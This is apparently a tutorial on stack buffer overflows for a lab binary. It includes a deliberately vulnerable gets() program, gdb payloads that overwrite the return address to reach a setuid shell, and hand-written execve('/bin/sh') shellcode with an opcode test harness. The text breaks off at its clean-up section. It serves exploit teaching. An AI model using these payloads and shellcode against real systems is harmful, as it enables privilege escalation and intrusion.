# Stack Overflow
---
Stack overflow is about a [[Buffer Overflow|buffer overflow]] vulnerability which purpose is not to overwrite variables after the buffer, but also to overwrite the saved return address.

## Jump to an arbitrary address
---
```C
#include <unistd.h>
#include <string.h>

// gcc stack-overflow.c -o stack-overflow -fno-stack-protector -no-pie -z execstack -m32

// Function that sets user id to 0 and execute the shell
void shell(){
  setuid(0);
  system("/bin/sh");
}

void vuln_func(){
  char vuln_buff[250];
  // vulnerable
  gets(vuln_buff);
}

int main(int argc, char *argv[]){
  vuln_func();
  return 0;
}
```

So, here we have a vulnerable function `vuln_func` that does the same stuff from the buffer overflow section. But now we will overflow the buffer and overwrite the return address to jump to an arbitrary address of the program. This address will be the address of the beginning of the `shell` function. Thus, when we overflow the buffer and overwrite the return address after the `vuln_func` completes its execution, it will take the new return address and jump to the shell function.

To determine the offset (gdb):
```bash
gef➤  r < <(python -c 'print "A"*250 + "B"*16')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "A"*250 + "B"*16')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

My offset is 12 bytes. The next 4 bytes will overwrite the return address. You can have a different offset.

Next, find the start address of `shell` function:
```bash
gef➤  disas shell
Dump of assembler code for function shell:
   0x080491d6 <+0>:	endbr32
   0x080491da <+4>:	push   ebp
   0x080491db <+5>:	mov    ebp,esp
   0x080491dd <+7>:	push   ebx
   0x080491de <+8>:	sub    esp,0x4
   0x080491e1 <+11>:	call   0x8049110 <__x86.get_pc_thunk.bx>
   0x080491e6 <+16>:	add    ebx,0x2e1a
   0x080491ec <+22>:	sub    esp,0xc
   0x080491ef <+25>:	push   0x0
   0x080491f1 <+27>:	call   0x80490b0 <setuid@plt>
   0x080491f6 <+32>:	add    esp,0x10
   0x080491f9 <+35>:	sub    esp,0xc
   0x080491fc <+38>:	lea    eax,[ebx-0x1ff8]
   0x08049202 <+44>:	push   eax
   0x08049203 <+45>:	call   0x8049090 <system@plt>
   0x08049208 <+50>:	add    esp,0x10
   0x0804920b <+53>:	nop
   0x0804920c <+54>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804920f <+57>:	leave  
   0x08049210 <+58>:	ret    
End of assembler dump.
```

`0x080491d6` is that's what you need.

Then, try to replace last 4 bytes in payload on this address:
```bash
gef➤  r < <(python -c 'print "A"*250 + "B"*12 + "\xd6\x91\x04\x08"')
Starting program: /home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow < <(python -c 'print "A"*250 + "B"*12 + "\xd6\x91\x04\x08"')
[Detaching after vfork from child process 6753]

Program received signal SIGSEGV, Segmentation fault.
0xf7fa8000 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
Segmentation fault is nothing because you can see that the gdb shows you detaching. It means that the shell is executed.

Again, you have a shell, or if this program would be with SUID bit set, you would get the root or another user who is owned this program.

### Why is this happening?

Programming languages such as C, in which the High-level language instructions map to typical machine language do not provide any mechanism to identify if the buffer (char array) declared on to the stack, can take the input more than was it was supposed to take. The reason for non-checking such sort of mechanism was to achieve the speed part of the machine language.

Stack overflow things:
1. C does not check buffer overflow.
2. Buffers are stored in a lower to a higher memory address.
3. Just after the buffer, after overflowing it to a certain amount can update saved variables, old EBP register value, and return address.
4. If the return address is changed we can change the control flow.

## Shellcode writing

Now, when you can jump to an arbitrary address, you might think that you can jump to your input data. Yes, you can. But what will yout input data look like? Your input data needs to be low-level compiled assembly code that is the same as a chain of opcodes. But also, let's understand what a shellcode and a payload are.

Shellcode is a small piece of payload in binary language that is used to inject to vulnerable binary files. Or the same as I said above about the input data.

A payload contains the shellcode, the offset(to fill the buffer to overwrite the return address), and the return address itself. A payload definition is flexible and depends on the vulnerability. I'll just make a note of how it will lool in further vulnerabilities.

Steps to write shellcode:
1. Write desired shellcode in a high-level language.
2. Compile and disassemble the high-level shellcode program.
3. Analyze how the progran works from an assembly level.
4. Clean up the assembly to make it smaller and injectable.
5. Extract opcodes and crate shellcode.

### Write desired shellcode in a high-level language

Shellcode in C:
```C
#include <stdlib.h>
// gcc high-level-shellcode.c -o high-level-shellcode
// use -m32 to compile in 64-bit

int main(){
  // Start a new process /bin/sh or just spawn a shell
  execve("/bin/sh", NULL, NULL);
  // Exit normally
  exit(0);
}
```

### Compile and disassmble the high-level shellcode program

I compiled it in 32-bit with `gcc high-level-shellcode.c -o high-level-shellcode -m32` because it is easy to explain and with the 64-bit it is the same. Disassembly it with `objdump -d high-level -M intel`, then find the main function.

Analyze how the program works from an assembly level

The main function:
```bash
000011ed <main>:
    11ed:	f3 0f 1e fb          	endbr32
    11f1:	8d 4c 24 04          	lea    ecx,[esp+0x4]
    11f5:	83 e4 f0             	and    esp,0xfffffff0
    11f8:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
    11fb:	55                   	push   ebp
    11fc:	89 e5                	mov    ebp,esp
    11fe:	53                   	push   ebx
    11ff:	51                   	push   ecx
    1200:	e8 eb fe ff ff       	call   10f0 <__x86.get_pc_thunk.bx>
    1205:	81 c3 cf 2d 00 00    	add    ebx,0x2dcf
    120b:	83 ec 04             	sub    esp,0x4
    120e:	6a 00                	push   0x0
    1210:	6a 00                	push   0x0
    1212:	8d 83 34 e0 ff ff    	lea    eax,[ebx-0x1fcc]
    1218:	50                   	push   eax
    1219:	e8 82 fe ff ff       	call   10a0 <execve@plt>
    121e:	83 c4 10             	add    esp,0x10
    1221:	83 ec 0c             	sub    esp,0xc
    1224:	6a 00                	push   0x0
    1226:	e8 55 fe ff ff       	call   1080 <exit@plt>
    122b:	66 90                	xchg   ax,ax
    122d:	66 90                	xchg   ax,ax
    122f:	90                   	nop
```

The main part here starts at `push 0x0`. The `execve()` function is just a system call. And it has its standard. Here, you see that the program pushes two zeros into the stack and then pushes the EAX, which is just a pointer to our `/bin/sh`. Then it does `call 10a0 <execve@plt>` which is moves the number of a system call in the EAX register and sends interruption to execute a system call (The CPU switches to kernel mode). 

As this 32-bit syscall table says the standard for an execve system call:
```bash
|-------------eax------ebx-------ecx---edx--|
|sys_execve | 0x0b | filename | argv | envp |
|-------------------------------------------|
``````

In our disassembly code, arguments are pushed onto the stack, but by standard, they can be in registers as above.
After the execve syscall, the stack cleans and a new syscall `exit()` qill execute with 0 as an argument.
Something after that doesn't matter.

Write the shellcode:
```nasm
; nasm -f elf32 dirty-low-level-shellcode.asm
; ld -m elf_i386 dirty-low-level-shellcode.o -o dirty-low-level-shellcode

; push the string '/bin/sh\0
push 0x68732f00
push 0x6e69622f
; move the first argument (/bin//sh) to ebx
mov ebx, esp
; push address of the string
push ebx
; move the second argumetn (argv array) to ecx
mov ecx, esp
; move to eax the number of the syscall
mov eax, 0xb
; do interruption
int 0x80
```

You need to extract opcodes:
```bash
# Assemble the file
nasm -f elf32 dirty-low-level-shellcode.asm
# Link an obj file
ld -m elf_i386 dirty-low-level-shellcode.o -o dirty-low-level-shellcode
# See the opcodes
objdump -d dirty-low-level-shellcode -M intel
```

Here, you don't need to link an obj file, you can disassembly it after assembling and extract the opcodes.
This chain of commands will extract the opcodes in the appropriate view:
```bash
objdump -d dirty-low-level-shellcode.o -M intel | grep '[0-9a-f]:' | grep -v 'file' | cur -f2 -d: | cut -f1-6 -d' '| tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/ˆ/"/'| sed 's/$/"/g'
```

objdump listing:
```bash
dirty-low-level-shellcode: file format elf32-i386

Disassembly of section .text:

08049000 <__bss_start-0x1000>:
 8049000:	68 00 2f 73 68       	push   $0x68732f00
 8049005:	68 2f 62 69 6e       	push   $0x6e69622f
 804900a:	89 e3                	mov    %esp,%ebx
 804900c:	53                   	push   %ebx
 804900d:	89 e1                	mov    %esp,%ecx
 804900f:	b8 0b 00 00 00       	mov    $0xb,%eax
 8049014:	cd 80                	int    $0x80
```

You got the shellcode. Next, you need to test it.
```C
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x68\x00\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80";

void main() {
    printf("Shellcode length: %d\n", strlen(shellcode));
    // Declare a funcion pointer named ret
    // Then cast the shellcode pointer to the function pointer of the same size
    int (*ret)() = (int(*)())shellcode;
    // Call the function
    ret();
  }
```

If you try to compile and execute it, you will end up with a shellcode length of 1 byte, which is not the true length of the shellcode. Why? The reason is that the shellcode is dirty, not injectable. When you enter a shellcode into a vulnerable program, the program prevents you from entering the complete shellcode because it stops accepting characters when it finds a null byte.

### Clean up the assembly to make it smaller and injectable

